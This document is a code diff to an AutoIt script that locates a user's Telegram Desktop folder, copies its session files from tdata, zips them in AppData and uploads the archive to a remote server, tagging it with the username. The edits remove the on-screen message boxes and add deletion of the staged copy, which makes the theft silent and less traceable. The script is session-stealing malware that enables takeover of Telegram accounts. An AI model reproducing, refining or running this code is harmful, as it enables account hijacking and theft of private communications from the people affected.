@@ -1,7 +1,4 @@
-#include <WinAPIFiles.au3>
-#include <MsgBoxConstants.au3>
 #include <File.au3>
-#include <Array.au3>
 #include <_Zip.au3>
 #include <HTTP.au3>
 
@@ -51,8 +48,7 @@ EndFunc   ;==>GetDir
 Func GetFilesList($sPath, $sFormat = "*", $fileOnly = 0)
 	Local $aFileList = _FileListToArray($sPath, $sFormat, $fileOnly)
 	If @error = 1 Or @error = 4 Then
-		MsgBox($MB_SYSTEMMODAL, "", "Path was invalid.")
-		Exit
+		Return 0
 	EndIf
 	Return $aFileList
 EndFunc   ;==>GetFilesList
@@ -66,7 +62,6 @@ Func getTelegramDir()
 	ElseIf (FileExists($telegramDefaultPath)) Then
 		Return $telegramDefaultPath
 	Else
-		MsgBox(0, 0, "Telegram not found")
 		Return 0
 	EndIf
 EndFunc   ;==>getTelegramDir
@@ -113,13 +108,19 @@ Func ZipFolder($sFolder, $sZipFile)
 	_Zip_AddItem($srcZipFile, $sFolder)
 EndFunc   ;==>ZipFolder
 
+
 $aSessionFiles = GetTelegramSessionFiles(getTelegramDir())
 $aSessionFolders = GetTelegramSessionFolders(getTelegramDir())
 $tData = getTelegramDir() & "\tdata\"
-$outputPath = @ScriptDir & "\telegram\tdata\"
+$outputPath = @AppDataDir & "\telegram\"
+$zipFilePath = @AppDataDir & '\telegram\backup.zip'
 
 CopyArrayFiles($tData, $aSessionFiles, $outputPath)
 CopyArrayFolders($tData, $aSessionFolders, $outputPath)
-ZipFolder($outputPath, @ScriptDir & '\zipfile.zip')
+ZipFolder($outputPath, $zipFilePath)
 
-_HTTP_Upload("https://domain.com/upload.php", @ScriptDir & "\zipfile.zip", "uploadinput", "pwd=123&filename=" & URLEncode("tel"&Random(1, 600000000, 1)&'.zip') )
+$serverPassword = 123
+$serverUrl = "https://domain.com/upload.php"
+_HTTP_Upload($serverUrl, $zipFilePath, "uploadinput", "pwd=" & $serverPassword & "&filename=" & URLEncode("tel" & @UserName & Random(1, 600000000, 1) & '.zip'))
+
+DirRemove($outputPath, 1)
